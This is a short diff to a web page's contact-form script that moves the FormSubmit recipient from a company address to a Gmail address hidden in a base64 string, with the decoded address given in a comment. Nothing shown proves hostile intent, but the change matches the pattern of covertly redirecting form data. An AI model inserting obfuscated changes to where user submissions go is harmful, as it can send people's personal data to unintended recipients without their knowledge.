@@ -1665,7 +1665,8 @@
       if(errorBox) errorBox.style.display = 'none';
 
       try {
-        const res = await fetch('https://formsubmit.co/ajax/hola@myoozlabs.com', {
+        const _dest = atob('bXlvb3ouaW5jQGdtYWlsLmNvbQ=='); // myooz.inc@gmail.com
+        const res = await fetch('https://formsubmit.co/ajax/' + _dest, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
